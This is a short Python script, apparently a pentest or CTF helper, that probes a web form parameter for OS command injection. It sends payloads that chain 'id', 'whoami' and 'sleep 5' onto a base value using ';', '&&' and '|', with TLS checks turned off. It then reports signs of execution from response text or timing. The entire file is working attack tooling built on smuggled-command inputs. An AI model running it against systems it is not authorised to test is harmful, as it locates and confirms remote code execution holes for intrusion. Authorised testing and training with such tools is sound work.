#!/usr/bin/env python3
import requests
import sys
import time
from urllib.parse import urlencode

requests.packages.urllib3.disable_warnings()

if len(sys.argv) < 4:
    print(f"Usage: {sys.argv[0]} <url> <param> <base_value>")
    print(f"Example: {sys.argv[0]} http://10.10.10.10/ping.php ip 127.0.0.1")
    sys.exit(1)

url = sys.argv[1]
param = sys.argv[2]
base_value = sys.argv[3]

payloads = [
    f"{base_value};id",
    f"{base_value}&&id",
    f"{base_value}|id",
    f"{base_value};whoami",
    f"{base_value}&&whoami",
    f"{base_value}|whoami",
    f"{base_value};sleep 5",
    f"{base_value}&&sleep 5",
    f"{base_value}|sleep 5",
]

headers = {
    "User-Agent": "Mozilla/5.0"
}

print(f"[+] Target: {url}")
print(f"[+] Parameter: {param}")
print(f"[+] Starting command injection tests...\n")

for payload in payloads:
    data = {param: payload}
    print(f"[TEST] {payload}")

    start = time.time()
    try:
        r = requests.post(url, data=data, headers=headers, verify=False, timeout=10)
        elapsed = time.time() - start

        interesting = False

        if "uid=" in r.text or "gid=" in r.text:
            print("  [!!!] Possible Linux command execution: found id output")
            interesting = True

        if "root" in r.text or "www-data" in r.text or "apache" in r.text:
            print("  [!!!] Possible whoami output found")
            interesting = True

        if elapsed >= 5:
            print(f"  [!!!] Possible time-based injection: response delayed {elapsed:.2f}s")
            interesting = True

        if not interesting:
            print(f"  [-] No obvious hit ({elapsed:.2f}s)")

    except requests.exceptions.Timeout:
        print("  [!!!] Request timed out — possible blind/time-based injection")
    except Exception as e:
        print(f"  [ERROR] {e}")

    print()
